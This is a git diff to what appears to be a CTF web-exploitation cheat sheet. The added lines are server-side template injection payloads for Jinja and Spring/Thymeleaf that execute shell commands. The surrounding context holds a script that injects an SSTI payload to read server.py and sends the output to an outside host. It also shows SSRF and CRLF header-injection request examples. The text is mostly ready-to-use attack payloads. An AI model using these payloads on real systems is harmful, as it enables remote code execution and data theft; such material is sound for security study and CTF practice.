@@ -104,7 +104,11 @@ RegExp.prototype.test = new Proxy(RegExp.prototype.test, {
 
 # server-side template injection (SSTI)
 
+jinja:
+
 ```html
+{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
+
 <script>
 // Payload: {{ ''.class_.__mro__[1].__subclasses__()[412]("cat server.py", shell=True, stdout=-1).communicate() }}
 fetch('http://localhost:5000/',{
@@ -113,6 +117,13 @@ fetch('http://localhost:5000/',{
     body: "url=1&score=1&feedback=%7B%7B%20%27%27.__class__.__ mro__%5B1%5D.__ subclasses__%2829%5B412%5D%28%22cat%20server.py%22%2Cshell%3DTrue%2Cstdout%3D-1%29.communicate%28%29%20%7D%7D&nam=1"}).then(response => response.text()).then(data => fetch("http://demo.itmo.xyz/?nnn="+encodeURI(data)).then(response => document.write(response)));
 </script>
 ```
+
+spring, thymeleaf:
+
+```
+GET /path?lang=__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x HTTP/1.1
+```
+    https://github.com/veracode-research/spring-view-manipulation/
 
 # server-side request forgery (SSRF)
 
@@ -125,6 +136,7 @@ fetch('http://localhost:5000/',{
     - http://109.233.61.11:27280/?retpath=/news/%0d%0aX-Accel-Redirect:%20/secret/flag
         - https://www.tasteless.eu/post/2014/02/olympic-ctf-sochi-2014-xnginx-writeup/
 - https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
+- [PHP :: Sec Bug \#79329 :: get\_headers\(\) silently truncates after a null byte](https://bugs.php.net/bug.php?id=79329)
 
 ```bash
 curl -v 'https://let-me-see.pwn.institute/' -G --data-urlencode 'url=http://127.0.0.1/?url=http://daffy-malleable-tote.glitch.me/go'
